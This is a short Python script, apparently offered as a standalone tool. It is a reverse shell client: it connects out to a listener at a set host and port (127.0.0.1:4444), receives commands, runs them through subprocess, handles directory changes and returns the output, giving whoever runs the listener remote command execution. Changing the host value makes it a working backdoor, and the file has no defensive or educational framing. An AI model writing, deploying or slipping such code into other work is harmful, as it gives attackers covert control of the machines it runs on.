# Author : Nemuel Wainaina

import socket
import subprocess
import os

RHOST = "127.0.0.1"
PORT = 4444
SEP = "<sep>"
BUFFER = 1024 * 124

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    result = ""
    cmd = s.recv(BUFFER).decode()

    if cmd.lower() == "q":
        break

    cmdTmp = cmd.split(" ")

    if cmdTmp[0].lower() == "cd":
        try:
            os.chdir(" ".join(cmdTmp[1:]))

        except Exception as e:
            msg = str(e)
        
        else:
            result = ""
        
    else:
        result = subprocess.getoutput(cmd)

    cwd = os.getcwd()
    msg = f"{result}{SEP}{cwd}"
    s.send(msg.encode())

s.close()
